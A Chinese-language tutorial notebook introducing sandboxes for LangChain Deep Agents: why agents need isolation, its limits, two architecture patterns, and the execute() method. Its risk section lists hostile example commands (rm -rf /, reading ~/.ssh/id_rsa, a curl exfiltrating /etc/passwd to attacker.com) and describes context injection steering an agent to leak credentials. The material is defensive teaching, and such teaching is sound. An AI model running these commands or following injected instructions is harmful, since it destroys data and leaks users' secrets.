# 001 Sandbox Overview

这是 Sandbox 学习线的第一份 Notebook。

配套官方文档：

- [Sandboxes](https://docs.langchain.com/oss/python/deepagents/sandboxes)

本课不连接任何沙盒 provider，也不调用大模型。第一课只做一件事：理解 agent 为什么需要沙盒，以及沙盒如何在底层工作。

学习目标：

1. 理解 sandbox 是什么，以及为什么 agent 需要沙盒隔离。
2. 理解沙盒的隔离边界能保护什么、不能保护什么。
3. 区分 Sandbox as Tool 和 Agent in Sandbox 两种架构模式。
4. 理解 `execute()` 方法在沙盒架构中的核心角色。
5. 了解可用的沙盒 provider 和各自特点。
6. 明确后续课程每一步要做什么。

## 0. 本课程在 Deep Agents 中的位置

如果你已经完成 Deep Agents Quickstart 课程，你已经知道如何创建一个能搜索、能推理的 agent。

但 agent 还有一个关键能力还没涉及：**执行代码**。

Deep Agents 的 agent 可以：

```text
-> 搜索网页（Tavily）
-> 调用自定义工具
-> 委派子代理
-> 执行 Shell 命令（沙盒）
-> 读写文件（沙盒）
```

前三个不需要沙盒，后两个需要。

沙盒就是 agent 的「执行沙箱」——一个安全、隔离的运行时环境。

## 1. 为什么需要沙盒

Agent 生成代码、操作文件系统、运行 shell 命令。

如果 agent 直接在宿主机上执行这些操作：

```text
安全风险：
  rm -rf /   -> 删除本地文件
  cat ~/.ssh/id_rsa -> 窃取 SSH 密钥
  curl http://attacker.com?data=$(cat /etc/passwd) -> 外泄数据

环境风险：
  在本地装一堆依赖、污染 Python 环境
  进程驻留占用 CPU / 内存
```

沙盒在宿主机和 agent 之间加了一层隔离边界：

```text
宿主机                     沙盒                      Agent
+-----------+            +-----------+            +---------+
| 本地文件   |  不可见    | 独立文件系统 |  读写     | LLM     |
| 环境变量   |  <-------- | 独立进程空间 |  -------> | 工具调用 |
| 网络凭据   |            | 可限制网络  |            |         |
+-----------+            +-----------+            +---------+
```

用 Java 类比：

```text
沙盒 ≈ 一个每次用完就销毁的 Docker 容器
宿主机 ≈ 你的开发机，容器的 /etc 和你的 /etc 是隔离的
```

## 2. 沙盒能保护什么，不能保护什么

### 能保护

| 层面 | 保护方式 |
|------|----------|
| 文件系统 | Agent 无法读取宿主机文件 |
| 进程 | Agent 无法影响宿主机进程 |
| 环境变量 | 宿主机 `.env` / 密钥文件不可见 |
| 网络（可选） | 部分 provider 支持阻断沙盒网络 |

### 不能保护

**Context Injection**（上下文注入）：

如果攻击者能控制 agent 的部分输入，它可以指使 agent 在沙盒内执行任意命令。沙盒阻止了攻击者直接访问宿主机，但 agent 在沙盒内有完全控制权。

这意味着：

```text
不要把 API Key、数据库密码等凭据注入到沙盒环境变量中
注入后的凭据可以被 context injection 攻击读取并外泄
```

安全的最佳实践我们会在第三课详细讲。

## 3. 两种架构模式

Sandbox 和 Agent 的配合方式有两种。

### 模式 A：Sandbox as Tool（本课程使用）

Agent 运行在宿主机（或你的服务器）上，当需要执行代码时才调用沙盒工具。

```text
+----------+     execute()     +--------+
|  Agent   |  ---------------> | Sandbox |
| (宿主机)  |  <--------------- | (远端)  |
+----------+    stdout/stderr  +--------+
```

优点：

- Agent 代码更新即时生效，无需重建镜像
- API Key 留在宿主机，不进入沙盒
- 沙盒失败不影响 agent 状态
- 可以多个沙盒并行

缺点：

- 每次 execute 有网络延迟

### 模式 B：Agent in Sandbox

Agent 整个运行在沙盒内部，通过 WebSocket / HTTP 从外部与它通信。

```text
+----------+    消息      +-------------------+
| 客户端    |  ---------> | Sandbox 内的 Agent |
| (宿主机)  |  <--------- | (Docker / VM 镜像) |
+----------+   响应      +-------------------+
```

优点：

- 生产环境与本地开发一致
- Agent 和环境紧密耦合

缺点：

- API Key 必须放在沙盒内（安全风险）
- 更新 agent 需要重建镜像
- 需要额外的通信基础设施

本课程的 notebook 全部使用 **Sandbox as Tool** 模式。

## 4. 沙盒的核心方法：`execute()`

Sandbox backend 只需要实现一个方法：

```python
def execute(command: str) -> ExecutionResult:
    ...
```

返回结果包含：

```text
- output:  合并的 stdout + stderr
- exit_code: 退出码（0 成功，非 0 失败）
- truncated: 输出是否被截断（防止撑爆 context window）
```

其他所有文件操作（`read_file`、`write_file`、`edit_file`、`ls`、`glob`、`grep`）都是 `BaseSandbox` 基类在 `execute()` 之上封装出来的——它构造 shell 脚本，通过 `execute()` 在沙盒内执行。

```text
Agent 调用 read_file(path)
  -> BaseSandbox 构造: cat <path>
  -> execute("cat <path>")
  -> 返回文件内容
```

这意味着：

- **接入一个新的 provider 很简单**：只要实现 `execute()`，其他全是免费获得的。
- **execute 工具有条件可用**：如果 backend 没有实现 `SandboxBackendProtocol`，agent 根本看不到 `execute` 工具。

## 5. 可用 Provider 概览

Deep Agents 目前支持这些沙盒 provider：

| Provider | 安装包 / 方式 | 特点 |
|----------|---------------|------|
| Local（教学版） | Python 标准库 | 本课程使用，零依赖，理解原理最佳 |
| LangSmith | `deepagents` 内置 | 无需额外安装，成熟稳定 |
| E2B | `langchain-e2b` | 专注 AI agent 沙盒，支持快照 |
| Modal | `langchain-modal` | 按需计费，支持 GPU |
| Daytona | `langchain-daytona` | 开发环境即服务，支持 git |
| Runloop | `langchain-runloop` | 专注 AI agent 执行环境 |
| AgentCore | `langchain-agentcore-codeinterpreter` | AWS 生态，Bedrock 深度集成 |

本课程前两课选择 **Local Sandbox（教学版）**作为起步 provider，因为它：

1. 纯 Python 标准库，无需安装任何额外包
2. 代码完全透明，可以看到隔离机制的全部细节
3. 不需要 API Key，离线可用
4. `execute()` + 文件传输的核心接口与正式 provider 完全一致

学习完原理后，你可以无缝迁移到任何远程沙盒 provider。

下一课我们就来手写一个 LocalSandbox。

## 6. 后续课程预告

| 课程 | 内容 |
|------|------|
| 002 | 用 Python 标准库实现本地沙盒，执行命令和文件传输 |
| 003 | 生命周期管理（thread-scoped / assistant-scoped）、安全实践 |

第一课到此结束。当你准备好时，进入第二课。